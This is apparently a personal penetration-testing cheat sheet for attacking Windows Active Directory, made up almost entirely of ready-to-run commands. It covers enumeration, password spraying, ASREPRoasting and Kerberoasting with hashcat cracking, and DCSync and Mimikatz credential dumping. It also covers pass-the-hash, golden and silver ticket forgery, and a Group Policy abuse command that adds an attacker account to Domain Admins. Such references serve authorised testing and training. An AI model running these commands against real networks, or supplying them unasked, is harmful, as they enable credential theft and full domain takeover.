# Active Directory Enumeration

## Finding Domain Controller
```bash
# Look for Kerberos port 88
nmap -p 88 192.168.1.0/24

# Get DC DNS name
dig +short SRV _ldap._tcp.dc._msdcs.example.com

# Get DC IP
dig +short dc1.example.com

# Get other DCs
dnsrecon -d <domain-name> -t srv
```

## Finding Domain Name
```bash
# Nmap SMB scan
nmap --script smb-enum-domains -p 445 192.168.1.10

# SMBClient
smbclient -L //192.168.1.10 -N

# Enum4linux
enum4linux -a 192.168.1.10
```

## LDAP Anonymous Bind
```bash
# Check for anonymous bind and get naming contexts
ldapsearch -x -H ldap://<IP-or-host> -s base -b "" "(objectClass=*)" namingContexts

# Get basic domain info
ldapsearch -x -H ldap://<IP-or-host> -s base -b "DC=domain,DC=com"

# List all objects (if anonymous allowed)
ldapsearch -x -H ldap://<IP-or-host> -b "DC=domain,DC=com"
```

## SMB Null/Guest Session
```bash
# Null session with crackmapexec
nxc smb <ip> -u '' -p '' --shares

nxc smb <ip> -u 'guest' -p '' --shares

# Guest account enumeration
crackmapexec smb domain.com --shares
crackmapexec smb domain.com -u 'guest' -p '' --shares
impacket-lookupsid 'domain.com/guest'@domain.com -no-pass

# Batch null session scan for multiple IPs
while read -r ip; do echo "=== $ip ==="; timeout 10 nxc smb "$ip" -u "" -p "" --shares 2>&1 | sed -n '1,80p'; done < ips.txt

# Null session with smbclient
smbclient -N -L //<ip>

# Enum4linux comprehensive scan
enum4linux -a <ip>
```

## Password Spraying
```bash
# Download statistically likely usernames
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/refs/heads/master/top-formats.txt

# Password spray with common usernames
crackmapexec smb <domain> -u top-formats.txt -p 'password' --shares

# Custom username list based on gathered info
crackmapexec smb <domain> -u usernames.txt -p 'Password123' --shares

# If we get a hit, test against DC
nxc smb <dc-ip> -u 'username' -p 'password' --shares

# Enumerate domain users with valid credentials
lookupsid.py 'domain.com/username'@domain.com

# Get AD users with password info and descriptions
GetADUsers.py domain/username:password -all

# If cleartext info found, use PowerShell directly
# Option 1: Runas with netonly
runas /netonly /user:domain\username powershell.exe

# Option 2: Rubeus asktgt + pass-the-ticket
Rubeus.exe asktgt /domain:domain /user:user /password:pass /ptt

# Then in PowerShell:
$dc = 'dc-ip'
Get-ADUser -Server $dc -Filter { Description -ne "$null" } -Property Description
Get-ADComputer -Server $dc -Filter { Description -ne "$null" } -Property Description

# Check domain password policy
nxc smb $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --pass-pol

# Test for pre-Windows 2000 default passwords
pre2k auth -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -n

# Check SMB signing and SMBv1 across network
nxc smb <ip-range> -d domain -u username -p password
nxc smb <ip-range> -d domain -u username -p password --shares

# Access interesting shares
smbclient //target/share -U username%password
```

## BloodHound Collection & Analysis
```bash
# Windows - Download and run SharpHound
# Download: powerview.ps1, sharphound.ps1

# Import and run SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory c:\Users\<username>\Desktop -OutputPrefix "audit"

# Kali - Start BloodHound
sudo neo4j start
bloodhound

# BloodHound Analysis - Look for:
# - Domain Admins
# - ASREPRoastable users
# - Kerberoastable users
# - Attack paths
# - Delegations (Constrained, Unconstrained, RBCD)
# - Group memberships
# - High-value targets
```

## ASREPRoasting (Kerberos PreAuth Disabled)
```bash
# Find users with Kerberos PreAuth disabled
GetNPUsers -dc-ip <dc-ip> domain/user

# Request ASREP hash for specific user
GetNPUsers -dc-ip <dc-ip> -request -outputfile hashes.asreproast domain/username

# PowerShell alternative with Rubeus
.\Rubeus.exe /user:target-user asreproast /nowrap /format:hashcat /outfile:hashes.txt

# Crack with hashcat
hashcat -m 18200 hashes.txt /path/to/wordlist

# After account takeover - Re-enumerate with new credentials
nxc smb <ip-range> -d domain -u newuser -p newpassword --shares
nxc smb <dc-ip> -d domain -u newuser -p newpassword --pass-pol
GetADUsers.py domain/newuser:newpassword -all
lookupsid.py 'domain.com/newuser'@domain.com
```

## Kerberoasting (Service Account Password Cracking)
```bash
# Request Kerberos service tickets for cracking
GetUserSPNs -request -dc-ip <dc-ip> domain/user

# PowerShell alternative with Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Crack with hashcat
hashcat -m 13100 hashes.kerberoast /path/to/wordlist

# After service account takeover - Re-enumerate with new credentials
nxc smb <ip-range> -d domain -u serviceuser -p servicepassword --shares
nxc smb <dc-ip> -d domain -u serviceuser -p servicepassword --pass-pol
GetADUsers.py domain/serviceuser:servicepassword -all
lookupsid.py 'domain.com/serviceuser'@domain.com
```

## Delegations

### Unconstrained Delegation (KUD)
```bash
# Find unconstrained delegations
findDelegation.py -dc-ip <ip> domain/user:password

# PowerShell verification options:
# Option 1 - UserAccountControl flag
Get-ADObject -Server $dc -Filter {UserAccountControl -band 524288} -Properties SamAccountName, UserAccountControl | ft ObjectClass, SamAccountName, UserAccountControl

# Option 2 - TrustedToAuth property
$users = Get-ADUser -Server $dc -Filter {TrustedToAuth -eq $true} -Properties SamAccountName, TrustedToAuth
$computers = Get-ADComputer -Server $dc -Filter {TrustedToAuth -eq $true} -Properties SamAccountName, TrustedToAuth
($users + $computers) | ft ObjectClass, SamAccountName, TrustedToAuth

# Option 3 - TrustedForDelegation property
Get-ADUser -Server dc.domain.com -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | ft SamAccountName,TrustedForDelegation
Get-ADComputer -Server dc.domain.com -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | ft SamAccountName,TrustedForDelegation

# Multiple exploitation scenarios - see: https://www.thehacker.recipes/ad/movement/kerberos/delegations/
```

### Constrained Delegation (KCD)
```bash
# Find constrained delegations
findDelegation.py -dc-ip <ip> domain/user:password

# PowerShell verification - msDS-AllowedToDelegateTo attribute
Get-ADObject -Server $dc -Filter {msDS-AllowedToDelegateTo -ne $null} -Properties msDS-AllowedToDelegateTo | ft SamAccountName, msDS-AllowedToDelegateTo

# Check specific account's delegation targets
Get-ADUser -Server $dc -Identity "username" -Properties msDS-AllowedToDelegateTo | Select-Object SamAccountName, msDS-AllowedToDelegateTo
Get-ADComputer -Server $dc -Identity "computername" -Properties msDS-AllowedToDelegateTo | Select-Object SamAccountName, msDS-AllowedToDelegateTo
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# Find RBCD delegations
findDelegation.py -dc-ip <ip> domain/user:password

# PowerShell verification - msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Get-ADObject -Server $dc -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | ft SamAccountName, msDS-AllowedToActOnBehalfOfOtherIdentity

# Check specific account's RBCD configuration
Get-ADUser -Server $dc -Identity "username" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object SamAccountName, msDS-AllowedToActOnBehalfOfOtherIdentity
Get-ADComputer -Server $dc -Identity "computername" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object SamAccountName, msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Machine Account Quota (Computer Creation) Vulnerability
```bash
# Check Machine Account Quota (default is 10)
Get-ADObject ((Get-ADDomain -Server $dc).DistinguishedName) -Server $dc -Property ms-DS-MachineAccountQuota

# Create new computer account (if quota allows)
addcomputer.py domain/user:password -dc-host DC -computer-name 'backdoor$' -computer-pass password123
```

## Privilege Escalation

### DCSync Attack (Domain Controller Synchronization)
```bash
# Windows - Mimikatz
.\mimikatz.exe
lsadump::dcsync /user:domain\username

# Linux - Impacket (specific user)
impacket-secretsdump -just-dc-user username domain/user:password@dc-ip

# Linux - Impacket (all users)
impacket-secretsdump domain/user:password@dc-ip

# Use NTLM hash instead of password
impacket-secretsdump -just-dc-user username -hashes :ntlm_hash domain/user@dc-ip

# Target krbtgt account (for golden tickets)
impacket-secretsdump -just-dc-user krbtgt domain/user:password@dc-ip

# Crack extracted hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### SAM/LSA Secrets Dumping
```bash
# Windows - Mimikatz (extract cached credentials)
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Windows - Alternative tools
.\pypykatz.exe live lsa
.\secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

### Pass-the-Hash (NTLM Hash Authentication)
```bash
# Linux - CrackMapExec
nxc smb target-ip -u username -H ntlm_hash

# Linux - Impacket
psexec.py domain/username@target-ip -hashes :ntlm_hash
smbexec.py domain/username@target-ip -hashes :ntlm_hash

# Windows - Mimikatz
sekurlsa::pth /user:username /domain:domain /ntlm:ntlm_hash
```

### Pass-the-Ticket (Kerberos Ticket Usage)
```bash
# Linux - Export ticket and use
export KRB5CCNAME=username.ccache
smbclient //target/share -k

# Windows - Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

### Golden Ticket (Forged TGT)
```bash
# Windows - Mimikatz (requires krbtgt hash)
kerberos::golden /user:administrator /domain:domain.com /sid:domain-sid /krbtgt:krbtgt-hash /ptt

# Linux - Impacket
ticketer.py -nthash krbtgt-hash -domain-sid domain-sid -domain domain.com administrator
```

### Silver Ticket (Forged Service Ticket)
```bash
# Windows - Mimikatz (requires service account hash)
kerberos::golden /user:administrator /domain:domain.com /sid:domain-sid /target:target-server /service:cifs /rc4:service-hash /ptt

# Linux - Impacket
ticketer.py -nthash service-hash -domain-sid domain-sid -domain domain.com -spn cifs/target-server administrator
```

### Overpass-the-Hash (NTLM to Kerberos)
```bash
# Windows - Rubeus
.\Rubeus.exe asktgt /user:username /domain:domain.com /rc4:ntlm_hash /ptt

# Windows - Mimikatz
sekurlsa::pth /user:username /domain:domain.com /ntlm:ntlm_hash /run:cmd
```

### Group Policy Abuse
```bash
# GPOwned - Create immediate scheduled task (execute as SYSTEM)
GPOwned -u 'user' -p 'password' -d 'domain' -dc-ip 'dc-ip' -gpoimmtask -name '{GPO-GUID}' -author 'DOMAIN\Administrator' -taskname 'TaskName' -taskdescription 'Description' -dstpath 'c:\windows\system32\calc.exe'

# pyGPOabuse - Add local admin to existing GPO
pygpoabuse 'domain'/'user':'password' -gpo-id "GPO-GUID"

# PowerShell - Invoke-GPOwned (MultiTasking Attack)
Invoke-GPOwned -GPOName "Target_GPO_Name" -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" -User "Attacker" -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author "DA_User" -SecondXMLCMD "/r net group 'Domain Admins' <Attacker> /add /domain"

# Force Group Policy update on target
gpupdate /force
```

### DACL Abuse
```bash
# DACL abuse techniques - see: https://www.thehacker.recipes/ad/movement/dacl/
```

---
